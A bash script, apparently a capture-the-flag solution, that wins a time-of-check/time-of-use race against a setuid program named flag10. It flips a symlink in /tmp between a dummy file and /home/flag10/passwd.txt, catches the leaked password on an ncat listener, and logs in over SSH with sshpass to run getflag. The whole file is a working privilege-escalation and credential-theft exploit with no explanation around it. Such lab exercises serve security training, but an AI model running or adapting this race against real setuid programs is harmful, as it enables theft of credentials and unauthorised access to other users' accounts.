#!/usr/bin/env bash

touch /tmp/flag10a
while :; do
    ln -f -s /home/flag10/passwd.txt /tmp/flag10b 2>/dev/null
    ln -f -s /tmp/flag10a /tmp/flag10b 2>/dev/null
done &

while :; do
    /home/flag10/flag10 /tmp/flag10b 127.0.0.1 &>/dev/null
done &

while read -r line; do
    case "$line" in
        *"password is"*)
            flagpass="${line##* }"
            break
            ;;
    esac
done < <(ncat -k -l -p 18211); unset line

if [[ -n $flagpass ]]; then
    SSHPASS="$flagpass" sshpass -e -- \
        ssh -l flag10 -o StrictHostKeyChecking=no 127.0.0.1 getflag
fi

pkill -P $$
sleep 1
rm -f /tmp/flag10*
